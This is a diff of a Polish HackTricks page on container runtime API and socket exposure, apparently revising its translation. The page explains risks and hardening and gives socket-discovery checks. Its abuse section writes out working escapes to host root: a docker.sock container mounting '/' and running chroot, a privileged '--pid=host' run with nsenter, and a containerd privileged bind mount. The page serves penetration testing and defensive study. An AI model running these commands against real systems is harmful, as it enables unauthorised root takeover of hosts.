@@ -1,18 +1,18 @@
-# Runtime API i ekspozycja demona
+# Runtime API i ujawnienie Daemona
 
 {{#include ../../../banners/hacktricks-training.md}}
 
 ## Przegląd
 
-Wiele rzeczywistych kompromitacji kontenerów wcale nie zaczyna się od ucieczki z namespace. Zaczynają się od dostępu do runtime control plane. Jeśli workload może rozmawiać z `dockerd`, `containerd`, CRI-O, Podman, lub kubelet przez zamontowany Unix socket lub wystawiony TCP listener, atakujący może być w stanie zażądać nowego kontenera z wyższymi uprawnieniami, zamontować filesystem hosta, dołączyć do host namespaces lub pobrać wrażliwe informacje o nodzie. W takich przypadkach runtime API jest prawdziwą granicą bezpieczeństwa, a jego kompromitacja jest funkcjonalnie bliska kompromitacji hosta.
+Wiele rzeczywistych kompromisów kontenerów wcale nie zaczyna się od namespace escape. Zaczynają się od dostępu do runtime control plane. Jeśli workload może komunikować się z `dockerd`, `containerd`, CRI-O, Podman, lub kubelet przez zamontowany Unix socket lub wystawiony TCP listener, atakujący może zażądać nowego kontenera z większymi uprawnieniami, zamontować system plików hosta, dołączyć do namespace'ów hosta lub pobrać wrażliwe informacje o nodzie. W takich przypadkach runtime API jest prawdziwą granicą bezpieczeństwa, a jego kompromitacja jest funkcjonalnie zbliżona do kompromitacji hosta.
 
-Dlatego ekspozycja runtime socket powinna być dokumentowana oddzielnie od zabezpieczeń jądra. Kontener z zwykłym seccomp, capabilities i MAC confinement może nadal być o jedno wywołanie API od kompromitacji hosta, jeśli `/var/run/docker.sock` lub `/run/containerd/containerd.sock` jest w nim zamontowany. Izolacja jądra bieżącego kontenera może działać dokładnie zgodnie z projektem, podczas gdy płaszczyzna zarządzania runtime pozostaje w pełni wystawiona.
+Dlatego ujawnienie socketów runtime powinno być dokumentowane oddzielnie od zabezpieczeń jądra. Kontener z domyślnym seccomp, capabilities i MAC confinement może wciąż być o jedno wywołanie API od kompromitacji hosta, jeśli `/var/run/docker.sock` lub `/run/containerd/containerd.sock` jest w nim zamontowany. Izolacja jądra bieżącego kontenera może działać dokładnie tak, jak zaprojektowano, podczas gdy warstwa zarządzania runtime pozostaje w pełni ujawniona.
 
-## Modele dostępu do demona
+## Modele dostępu do daemonów
 
-Docker Engine tradycyjnie udostępnia swój uprzywilejowany API przez lokalny Unix socket pod adresem `unix:///var/run/docker.sock`. Historycznie był też wystawiany zdalnie przez TCP listeners takie jak `tcp://0.0.0.0:2375` lub TLS-protected listener na `2376`. Wystawienie demona zdalnie bez silnego TLS i uwierzytelniania klienta skutecznie zamienia Docker API w zdalny interfejs root.
+Docker Engine tradycyjnie udostępnia swój uprzywilejowany API przez lokalny Unix socket `unix:///var/run/docker.sock`. Historycznie był on także wystawiany zdalnie przez TCP listenery takie jak `tcp://0.0.0.0:2375` lub przez TLS-protected listener na porcie `2376`. Wystawienie demona zdalnie bez silnego TLS i uwierzytelniania klienta skutecznie zamienia Docker API w zdalny interfejs root.
 
-containerd, CRI-O, Podman i kubelet udostępniają podobne powierzchnie o wysokim wpływie. Nazwy i workflowy się różnią, ale logika pozostaje ta sama. Jeśli interfejs pozwala wywołującemu tworzyć workloady, montować ścieżki hosta, pobierać poświadczenia lub modyfikować działające kontenery, to interfejs jest uprzywilejowanym kanałem zarządzania i powinien być traktowany odpowiednio.
+containerd, CRI-O, Podman i kubelet udostępniają podobne powierzchnie o wysokim wpływie. Nazwy i workflowy się różnią, ale logika pozostaje ta sama. Jeśli interfejs pozwala wywołującemu tworzyć workloads, montować ścieżki hosta, pobierać credentials lub modyfikować działające kontenery, interfejs jest uprzywilejowanym kanałem zarządzania i powinien być traktowany odpowiednio.
 
 Typowe lokalne ścieżki warte sprawdzenia to:
 ```text
@@ -25,22 +25,22 @@ Typowe lokalne ścieżki warte sprawdzenia to:
 /run/buildkit/buildkitd.sock
 /run/firecracker-containerd.sock
 ```
-Starsze lub bardziej wyspecjalizowane stosy mogą również ujawniać punkty końcowe takie jak `dockershim.sock`, `frakti.sock`, lub `rktlet.sock`. Są one mniej powszechne we współczesnych środowiskach, ale gdy się z nimi zetkniemy, powinny być traktowane z taką samą ostrożnością, ponieważ reprezentują powierzchnie kontroli środowiska wykonawczego, a nie zwykłe gniazda aplikacji.
+Starsze lub bardziej wyspecjalizowane stosy mogą również udostępniać punkty końcowe takie jak `dockershim.sock`, `frakti.sock` lub `rktlet.sock`. Są one mniej powszechne we współczesnych środowiskach, ale po ich napotkaniu należy traktować je z taką samą ostrożnością, ponieważ reprezentują powierzchnie kontroli środowiska wykonawczego, a nie zwykłe gniazda aplikacji.
 
-## Secure Remote Access
+## Bezpieczny dostęp zdalny
 
-Jeżeli demon musi być wystawiony poza lokalne gniazdo, połączenie powinno być zabezpieczone przy użyciu TLS i najlepiej z wzajemnym uwierzytelnianiem, tak aby demon weryfikował klienta, a klient weryfikował demona. Stary zwyczaj otwierania demona Dockera przez zwykłe HTTP dla wygody jest jednym z najniebezpieczniejszych błędów w administracji kontenerami, ponieważ powierzchnia API jest na tyle silna, że umożliwia bezpośrednie tworzenie uprzywilejowanych kontenerów.
+Jeśli daemon musi być wystawiony poza lokalne gniazdo, połączenie powinno być chronione przy użyciu TLS i najlepiej z uwierzytelnianiem wzajemnym, tak aby daemon weryfikował klienta, a klient weryfikował daemon. Dawne przyzwyczajenie otwierania Docker daemon na zwykłym HTTP dla wygody jest jednym z najniebezpieczniejszych błędów w administracji kontenerami, ponieważ powierzchnia API jest wystarczająco silna, by pozwalać na bezpośrednie tworzenie uprzywilejowanych kontenerów.
 
-Historyczny wzorzec konfiguracji Dockera wyglądał następująco:
+Historyczny wzorzec konfiguracji Docker wyglądał następująco:
 ```bash
 DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
 sudo service docker restart
 ```
-Na hostach opartych na systemd komunikacja procesu działającego jako daemon może także pojawić się jako `fd://`, co oznacza, że proces dziedziczy wstępnie otwarty socket od systemd zamiast samodzielnie go bindować. Ważna lekcja nie polega na dokładnej składni, lecz na konsekwencjach dla bezpieczeństwa. W chwili gdy daemon nasłuchuje poza ściśle uprawnionym lokalnym socketem, bezpieczeństwo transportu i uwierzytelnianie klienta stają się obowiązkowe, a nie opcjonalne środki hardeningu.
+Na hostach opartych na systemd komunikacja daemon może także pojawić się jako `fd://`, co oznacza, że proces dziedziczy wstępnie otwarty socket od systemd zamiast samodzielnie go wiązać. Ważna lekcja to nie dokładna składnia, lecz konsekwencje dla bezpieczeństwa. W momencie gdy daemon nasłuchuje poza ściśle uprawnionym lokalnym socketem, transport security i client authentication stają się obowiązkowe, a nie opcjonalne wzmocnienie.
 
-## Wykorzystanie
+## Nadużycie
 
-Jeśli obecny jest runtime socket, potwierdź który to, czy istnieje kompatybilny klient oraz czy możliwy jest surowy dostęp HTTP lub gRPC:
+Jeśli obecny jest runtime socket, potwierdź który to socket, czy istnieje kompatybilny klient oraz czy możliwy jest surowy dostęp HTTP lub gRPC:
 ```bash
 find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
 ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
@@ -48,57 +48,58 @@ docker -H unix:///var/run/docker.sock version 2>/dev/null
 ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
 crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
 ```
-Te polecenia są przydatne, ponieważ rozróżniają pomiędzy martwą ścieżką, zmontowanym, ale niedostępnym socketem oraz aktywnym uprzywilejowanym API. Jeśli clientowi się powiedzie, kolejne pytanie brzmi, czy API może uruchomić nowy container z host bind mount lub host namespace sharing.
-
 ### Pełny przykład: Docker Socket To Host Root
 
-Jeśli `docker.sock` jest osiągalny, klasyczną ucieczką jest uruchomienie nowego containera, który montuje root filesystem hosta, a następnie wejście do niego za pomocą `chroot`:
+Te polecenia są przydatne, ponieważ rozróżniają nieistniejącą ścieżkę, zamontowany, lecz niedostępny socket oraz działające uprzywilejowane API. Jeśli client się powiedzie, kolejne pytanie brzmi, czy API może uruchomić nowy container z host bind mount lub host namespace sharing.
+
+Jeśli `docker.sock` jest osiągalny, klasyczny escape polega na uruchomieniu nowego containera, który montuje host root filesystem, a następnie wykonuje `chroot` do niego:
 ```bash
 docker -H unix:///var/run/docker.sock images
 docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
 ```
-To zapewnia bezpośrednie wykonanie jako root na hoście przez Docker daemon. Skutki nie ograniczają się do odczytu plików. Po wejściu do nowego kontenera atakujący może modyfikować pliki na hoście, pozyskiwać poświadczenia, wprowadzać mechanizmy utrzymywania dostępu lub uruchamiać dodatkowe uprzywilejowane obciążenia.
+To zapewnia bezpośrednie wykonanie na hoście z uprawnieniami root poprzez Docker daemon. Skutki nie ograniczają się do odczytu plików. Po wejściu do nowego container atakujący może modyfikować pliki hosta, pozyskiwać poświadczenia, osadzić mechanizmy utrzymania dostępu lub uruchomić dodatkowe uprzywilejowane workloads.
 
 ### Pełny przykład: Docker Socket To Host Namespaces
 
-Jeśli atakujący woli wejście do przestrzeni nazw zamiast dostępu ograniczonego tylko do systemu plików:
+Jeśli atakujący woli namespace entry zamiast filesystem-only access:
 ```bash
 docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
 nsenter --target 1 --mount --uts --ipc --net --pid -- bash
 ```
-Ta ścieżka dociera do hosta, żądając od runtime utworzenia nowego kontenera z jawnym wystawieniem host-namespace, zamiast wykorzystywać bieżący.
+Ta ścieżka dociera do hosta, prosząc runtime o utworzenie nowego kontenera z jawnie wystawionym host-namespace, zamiast wykorzystywać bieżący.
 
 ### Pełny przykład: containerd Socket
 
-Zamontowany `containerd` socket jest zwykle równie niebezpieczny:
+Zamontowany socket `containerd` jest zwykle równie niebezpieczny:
 ```bash
 ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
 ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
 chroot /host /bin/sh
 ```
-Skutkiem jest ponowne przejęcie hosta. Nawet jeśli narzędzia specyficzne dla Docker są nieobecne, inny runtime API może nadal zapewniać te same uprawnienia administracyjne.
+Skutkiem ponownie jest przejęcie hosta. Nawet jeśli narzędzia specyficzne dla Docker nie są dostępne, inny runtime API może nadal zapewniać te same możliwości administracyjne.
 
 ## Checks
 
-Celem tych kontroli jest ustalenie, czy kontener może osiągnąć jakąkolwiek płaszczyznę zarządzania, która powinna pozostać poza granicą zaufania.
+Celem tych kontroli jest ustalenie, czy kontener może uzyskać dostęp do jakiejkolwiek płaszczyzny zarządzania, która powinna pozostawać poza granicą zaufania.
 ```bash
 find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
 mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
 ss -lntp 2>/dev/null | grep -E ':2375|:2376'
 env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE'
 ```
-Co jest tu interesujące:
+Warto zwrócić uwagę:
 
-- Zamontowany runtime socket zazwyczaj stanowi bezpośrednią prymitywę administracyjną, a nie jedynie ujawnienie informacji.
-- Nasłuch TCP na `2375` bez TLS należy traktować jako przesłankę zdalnej kompromitacji.
+- Zamontowany runtime socket zazwyczaj stanowi bezpośredni prymityw administracyjny, a nie jedynie ujawnienie informacji.
+- Nasłuch TCP na `2375` bez TLS należy traktować jako warunek kompromitacji zdalnej.
 - Zmienne środowiskowe, takie jak `DOCKER_HOST`, często ujawniają, że workload został celowo zaprojektowany do komunikacji z host runtime.
 
 ## Runtime Defaults
 
 | Runtime / platform | Default state | Default behavior | Common manual weakening |
 | --- | --- | --- | --- |
-| Docker Engine | Domyślnie lokalny Unix socket | `dockerd` nasłuchuje na lokalnym socket i daemon zwykle działa jako root | montowanie `/var/run/docker.sock`, wystawianie `tcp://...:2375`, słaby lub brakujący TLS na `2376` |
-| Podman | Domyślnie CLI bez daemona | Do zwykłego lokalnego użycia nie jest wymagany długotrwały uprzywilejowany daemon; sockety API mogą być jednak wystawione gdy `podman system service` jest włączony | wystawianie `podman.sock`, uruchamianie serwisu szeroko, użycie API z uprawnieniami roota |
-| containerd | Lokalny uprzywilejowany socket | API administracyjne wystawione przez lokalny socket i zwykle wykorzystywane przez narzędzia wyższego poziomu | montowanie `containerd.sock`, szeroki dostęp `ctr` lub `nerdctl`, wystawianie uprzywilejowanych przestrzeni nazw |
-| CRI-O | Lokalny uprzywilejowany socket | Endpoint CRI jest przeznaczony dla zaufanych komponentów lokalnych na węźle | montowanie `crio.sock`, wystawianie endpointu CRI na niezaufane workloady |
-| Kubernetes kubelet | Lokalny na węźle interfejs zarządzania (API) | Kubelet nie powinien być szeroko dostępny z Podów; dostęp może ujawnić stan poda, poświadczenia i funkcje wykonywania w zależności od authn/authz | montowanie socketów kubelet lub certyfikatów, słaba autentykacja kubelet, host networking oraz osiągalny endpoint kubelet |
+| Docker Engine | Local Unix socket by default | `dockerd` listens on the local socket and the daemon is usually rootful | mounting `/var/run/docker.sock`, exposing `tcp://...:2375`, weak or missing TLS on `2376` |
+| Podman | Daemonless CLI by default | No long-lived privileged daemon is required for ordinary local use; API sockets may still be exposed when `podman system service` is enabled | exposing `podman.sock`, running the service broadly, rootful API use |
+| containerd | Local privileged socket | Administrative API exposed through the local socket and usually consumed by higher-level tooling | mounting `containerd.sock`, broad `ctr` or `nerdctl` access, exposing privileged namespaces |
+| CRI-O | Local privileged socket | CRI endpoint is intended for node-local trusted components | mounting `crio.sock`, exposing the CRI endpoint to untrusted workloads |
+| Kubernetes kubelet | Node-local management API | Kubelet should not be broadly reachable from Pods; access may expose pod state, credentials, and execution features depending on authn/authz | mounting kubelet sockets or certs, weak kubelet auth, host networking plus reachable kubelet endpoint |
+{{#include ../../../banners/hacktricks-training.md}}
